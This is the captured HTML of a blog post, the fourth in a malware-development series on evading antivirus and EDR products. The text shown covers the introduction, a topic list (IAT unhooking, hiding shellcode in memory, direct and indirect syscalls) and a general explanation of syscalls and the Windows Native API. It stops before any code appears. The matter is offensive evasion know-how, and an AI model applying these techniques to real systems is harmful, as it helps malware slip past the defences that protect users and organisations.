# https://medium.com/@0xHossam/av-edr-evasion-malware-development-p-4-162662bb630e

<!DOCTYPE html><html lang="en" data-rh="lang" dir="ltr"><body><div id="root"><div class="a b c"><a href="https://medium.com/sitemap/sitemap.xml" class="d">Sitemap</a><div class="e f g h i j k l"></div><div></div><div class="m c"><div class="m n o p c" style="transform: translateY(0px);"><div class="q r s t u v w x y j e z ab"><a class="eb ai ec bg am b ao ap aq ar as at au av t v x j e r ed ab" href="https://play.google.com/store/apps/details?id=com.medium.reader&amp;referrer=utm_source%3DmobileNavBar&amp;source=post_page---top_nav_layout_nav-----------------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="ea"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ac r"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><button class="bg b ee ef ep eg eh eq ei ej er es el et eu eo ev ew ex ey ez fa fb fc fd fe ff fg fh fi fj fk bn fl fm" data-testid="headerSignUpButton">Sign up</button></span></p><div class="fn m"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSignInButton" rel="noopener follow" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Fav-edr-evasion-malware-development-p-4-162662bb630e&amp;source=post_page---top_nav_layout_nav-----------------------global_nav------------------" data-discover="true">Sign in</a></span></p></div></div></div><div class="q r s ac ae af"><div class="ac r ag"><a class="ah ai aj ak al am an ao ap aq ar as at au av ac" aria-label="Homepage" data-testid="headerMediumLogo" rel="noopener follow" href="https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------" data-discover="true"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" aria-labelledby="wordmark-medium-desc" viewBox="0 0 719 160" class="aw ax ay"><desc id="wordmark-medium-desc">Medium Logo</desc><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="az i"><div class="ac ak ba bb bc r bd be"><div class="bn" aria-describedby="searchResults" aria-labelledby="searchResults" aria-haspopup="listbox" role="listbox"></div><div class="bo bp ac"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ak bf bg bh ab bi bj bk bl bm" placeholder="Search" value=""></div></div></div><div class="i l x fp fq"><span data-dd-action-name="Susi presentation tracker new_post_topnav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerWriteButton" rel="noopener follow" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav------------------" data-discover="true"><div class="bg b bh ab eb fr fs ac r ft fu fv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg>Write</div></a></span></div><div class="l k j e"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSearchButton" rel="noopener follow" href="https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------" data-discover="true"><div class="bg b bh ab eb fr fs ac r ft fu fv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Search</span></div></a></div><div class="ge i l k"><div class="ac r"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><button class="bg b ee ef ep eg eh eq ei ej er es el et eu eo ev ew ex ey ez fa fb fc fd fe ff fg fh fi fj fk bn fl fm" data-testid="headerSignUpButton">Sign up</button></span></p><div class="fn m"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSignInButton" rel="noopener follow" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Fav-edr-evasion-malware-development-p-4-162662bb630e&amp;source=post_page---top_nav_layout_nav-----------------------global_nav------------------" data-discover="true">Sign in</a></span></p></div></div></div><div class="m"><div><div class="bn" role="tooltip" aria-describedby="1" aria-labelledby="1"><div tabindex="-1" class="bf"><button class="ak gf ao ac r aq fr gg gh gi" aria-label="user options menu" data-testid="headerUserIcon"><div class="m fr"><img alt="" class="m fk by bz ca de" width="32" height="32" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m bz ca fw o ak gk"></div></div></button></div></div></div></div></div></div><div class="ac"><div class="cb i l k j cc" style="width: 0px;"></div><div class="cd bi ce cf cg ch" style="width: calc(100% + 0px);"><div class="m"><div data-focus-guard="true" tabindex="-1" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div><div data-focus-lock-disabled="disabled"><div class="sx" role="dialog" aria-modal="true" tabindex="-1"><div class="xq xr bi ed xs xt xu aq xv hd xw" aria-hidden="true" role="presentation"></div><div class="xx xs xy xz ya xq ed fk yb yc yd lp ye yf yg yh yi yj yk yl ym yn ac cv yo" aria-hidden="true"><div class="yp gy"></div></div></div></div><div data-focus-guard="true" tabindex="-1" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div><div class="gl gm gn go gp m"><div class="ac ci"><div class="cp bi gq gr gs gt"></div></div><article><div class="m"><div class="m"><span class="m"></span><section><div><div class="fw gz yq hb hc hd"></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><div><h1 id="5ac2" class="pw-post-title hj hk hl bg hm hn ho hp hq hr hs ht hu hv hw hx hy hz ia ib ic id ie if ig ih ii ij ik il bl" data-testid="storyTitle" data-selectable-paragraph="">AV/EDR Evasion | Malware Development P — 4</h1><div><div class="speechify-ignore ac cw"><div class="speechify-ignore bi m"><div class="ac im in io ip iq ir is it iu iv iw"><div class="ac r iw"><div class="ac ix"><div><div class="bn" aria-describedby="3" aria-labelledby="3" role="tooltip"><div tabindex="-1" class="bf"><a rel="noopener follow" href="https://medium.com/@0xHossam?source=post_page---byline--162662bb630e---------------------------------------" data-discover="true"><div class="m iy iz by ja jb"><div class="m fr"><img alt="Hossam Ehab" class="m fk by bz ca de" width="32" height="32" loading="lazy" data-testid="authorPhoto" src="https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png"><div class="jc by m bz ca fw o jd gk"></div></div></div></a></div></div></div></div><span class="bg b bh ab bl"><div class="je ac r"><div class="ac r jf"><div class="ac r"><div><div class="bn" aria-describedby="4" aria-labelledby="4" role="tooltip"><div tabindex="-1" class="bf"><span class="bg b bh ab bl"><a class="ah ai aj fo al am an ao ap aq ar as at jg" data-testid="authorName" rel="noopener follow" href="https://medium.com/@0xHossam?source=post_page---byline--162662bb630e---------------------------------------" data-discover="true">Hossam Ehab</a></span></div></div></div></div><div class="jh bn"></div></div></div></span></div><div class="ac r ji"><span class="bg b bh ab eb"><div class="ac ag"><span data-testid="storyReadTime">22 min read</span><div class="jj jk m" aria-hidden="true"><span class="m" aria-hidden="true"><span class="bg b bh ab eb">·</span></span></div><span data-testid="storyPublishDate">May 27, 2023</span></div></span></div></div><div class="ac cw jl jm jn jo jp jq jr js jt ju jv jw jx jy jz ka"><div class="i l x fp fq r"><div class="kq m"><div class="ac r kr ks"><div class="pw-multi-vote-icon fr kt ku kv kw"><span data-dd-action-name="Susi presentation tracker clap_footer"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerClapButton" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F162662bb630e&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Fav-edr-evasion-malware-development-p-4-162662bb630e&amp;user=Hossam+Ehab&amp;userId=e6a0bffd3db&amp;source=---header_actions--162662bb630e---------------------clap_footer------------------" data-discover="true"><div><div class="bn" aria-describedby="5" aria-labelledby="5" role="tooltip"><div tabindex="-1" class="bf"><div class="kx aq ky kz la lb ao lc ld le kw" role="presentation"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></div></a></span></div><div class="pw-multi-vote-count m lf lg lh li lj lk ll"><p class="bg b ec ab eb"><span class="lm">--</span></p></div></div></div><div><div class="bn" aria-describedby="6" aria-labelledby="6" role="tooltip"><div tabindex="-1" class="bf"><button class="aq kx lp lq ac r fs lr ls" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="lo"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg><p class="bg b ec ab eb"><span class="pw-responses-count ln lo">1</span></p></button></div></div></div></div><div class="ac r kb kc kd ke kf kg kh ki kj kk kl km kn ko kp"><div class="lt l k j e"></div><div class="i l"><div><div class="bn" aria-describedby="7" aria-labelledby="7" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_footer"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerBookmarkButton" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F162662bb630e&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Fav-edr-evasion-malware-development-p-4-162662bb630e&amp;source=---header_actions--162662bb630e---------------------bookmark_footer------------------" data-discover="true"><span class=""><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb lu" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div><div class="fk lv cu"><div class="m ag"><div class="ac ci"><div class="lw lx ly lz ma mb cp bi"><div class="ac"><span data-dd-action-name="Susi presentation tracker post_audio_button"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D162662bb630e&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Fav-edr-evasion-malware-development-p-4-162662bb630e&amp;source=---header_actions--162662bb630e---------------------post_audio_button------------------" data-discover="true"><div><div class="bn" aria-describedby="53" aria-labelledby="53" role="tooltip"><div tabindex="-1" class="bf"><button aria-label="Listen" data-testid="audioPlayButton" class="ah fs aj fo al am an mc ap aq ar fe md me ls mf mg mh mi mj t mk ml mm mn mo mp mq v mr ms mt"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="k j e"><p class="bg b bh ab eb">Listen</p></div></button></div></div></div></a></span></div></div></div></div></div><div class="bn" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bn" aria-describedby="9" aria-labelledby="9" role="tooltip"><div tabindex="-1" class="bf"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="ah fs aj fo al am an mc ap aq ar fe md me ls mf mg mh mi mj t mk ml mm mn mo mp mq v mr ms mt"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="k j e"><p class="bg b bh ab eb">Share</p></div></button></div></div></div></div></div></div></div></div></div></div><p id="f2f4" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">IAT Unhooking &amp; Process Memory Hiding &amp; Syscalls</p><figure class="nv nw nx ny nz oa ns nt paragraph-image"><div role="button" tabindex="0" class="ob oc fr od bi oe"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="ns nt nu"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*i1XzohCsf11bGfwe9IyaeQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*i1XzohCsf11bGfwe9IyaeQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*i1XzohCsf11bGfwe9IyaeQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*i1XzohCsf11bGfwe9IyaeQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*i1XzohCsf11bGfwe9IyaeQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*i1XzohCsf11bGfwe9IyaeQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*i1XzohCsf11bGfwe9IyaeQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*i1XzohCsf11bGfwe9IyaeQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*i1XzohCsf11bGfwe9IyaeQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*i1XzohCsf11bGfwe9IyaeQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*i1XzohCsf11bGfwe9IyaeQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*i1XzohCsf11bGfwe9IyaeQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*i1XzohCsf11bGfwe9IyaeQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*i1XzohCsf11bGfwe9IyaeQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mb of c" width="700" height="304" loading="eager" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*i1XzohCsf11bGfwe9IyaeQ.png"></picture></div></div></figure><p id="95ec" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl og" data-selectable-paragraph=""><span class="m oh oi oj bp ok ol om on oo fr">W</span>elcome to our malware development blog! If you’re fascinated by malicious software and want to learn more, you’re in the right place. we covered the basics, including how antivirus systems function, evasion techniques, encryption, sandbox evasion, anti-debugging methods and more. Now, as we progress to parts 3 and 4, we’ll explore more advanced topics, such as unhooking, hooks, APIs, and where and how you can put your shellcode in memory and other aspects of malware development.. Whether you’re new or seasoned, let’s explore together!</p><p id="ee61" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">Part 1 — <a class="ah op" rel="noopener" href="https://medium.com/@0xHossam/av-edr-evasion-malware-development-933e50f47af5" data-discover="true">AV/EDR Evasion | Malware Development | by Hossam Ehab | Medium</a><br>Part 2 — <a class="ah op" rel="noopener" href="https://medium.com/@0xHossam/av-edr-evasion-malware-development-p2-7a947f7db354" data-discover="true">AV/EDR Evasion | Malware Development — P2 | by Hossam Ehab | Medium</a><br>Part 3 — <a class="ah op" rel="noopener" href="https://medium.com/@0xHossam/unhooking-memory-object-hiding-3229b75618f7" data-discover="true">AV/EDR Evasion | Malware Development P-3 | Medium</a></p><h3 id="cf3c" class="oq or hl bg os ot ou ef ov ow ox eh oy nf oz pa pb nj pc pd pe nn pf pg ph pi bl" data-selectable-paragraph="">Welcome to part 4 of the AV/EDR Evasion playlist. I’m Hossam Ehab, and in this article, we’ll explore crucial techniques for bypassing antivirus and endpoint detection and response (EDR) systems ..</h3><h3 id="f6d7" class="oq or hl bg os ot ou ef ov ow ox eh oy nf oz pa pb nj pc pd pe nn pf pg ph pi bl" data-selectable-paragraph="">First, we’ll dive into the Import Address Table (IAT) and Process Memory Hiding. Discover how to strategically place shellcode in memory to remain undetected during real-time scanning.</h3><h3 id="4e44" class="oq or hl bg os ot ou ef ov ow ox eh oy nf oz pa pb nj pc pd pe nn pf pg ph pi bl" data-selectable-paragraph="">Next, we’ll uncover the power of Syscalls and their role in evading detection and maintaining persistence and also the Native and Direct APIs.</h3><h3 id="e955" class="oq or hl bg os ot ou ef ov ow ox eh oy nf oz pa pb nj pc pd pe nn pf pg ph pi bl" data-selectable-paragraph="">Topics:</h3><p id="79aa" class="pw-post-body-paragraph mu mv hl mw b mx pj mz na nb pk nd ne nf pl nh ni nj pm nl nm nn pn np nq nr he bl" data-selectable-paragraph="">1 — What is the different between Native APIs &amp; Windows APIs<br>2 — IAT (Import address table) &amp; how to unhook it!?<br>3 — Hiding shellcode in memory (Process Memory Hiding)<br>4 — Direct &amp; Indirect Syscalls<br>5 — Resources &amp; How to learn more!</p></div></div></div><div class="ac ci po pp pq pr" role="separator"><span class="ps by bn pt pu pv"></span><span class="ps by bn pt pu pv"></span><span class="ps by bn pt pu"></span></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><h2 id="85a3" class="pw or hl bg os px py pz ov qa qb qc oy qd qe qf qg qh qi qj qk ql qm qn qo qp bl" data-selectable-paragraph="">Different between Native &amp; Windows APIs &amp; Syscalls</h2><p id="00dd" class="pw-post-body-paragraph mu mv hl mw b mx pj mz na nb pk nd ne nf pl nh ni nj pm nl nm nn pn np nq nr he bl" data-selectable-paragraph="">Syscalls, short for system calls, are a fundamental mechanism for communication between user-level programs and the operating system. They provide an interface for applications to request services from the operating system kernel, such as file operations, network communication, process management, and more. Syscalls are essential for interacting with the underlying hardware and resources of a computer system.</p><p id="27f7" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">When it comes to different operating systems, such as Windows, there are two primary APIs (Application Programming Interfaces) through which user-level programs can make syscalls: the Native API and the Windows API.</p><ol class=""><li id="c4df" class="mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr qq qr qs bl" data-selectable-paragraph="">Native API: The Native API, also known as the NT API, is the low-level interface provided by the Windows NT kernel. It is used internally by the operating system and provides direct access to kernel services. The Native API offers a comprehensive set of system functions and data structures, allowing developers to interact at a lower level with the operating system. It is powerful but complex and requires a deep understanding of the underlying system architecture.</li></ol><p id="be19" class="pw-post-body-paragraph mu mv hl 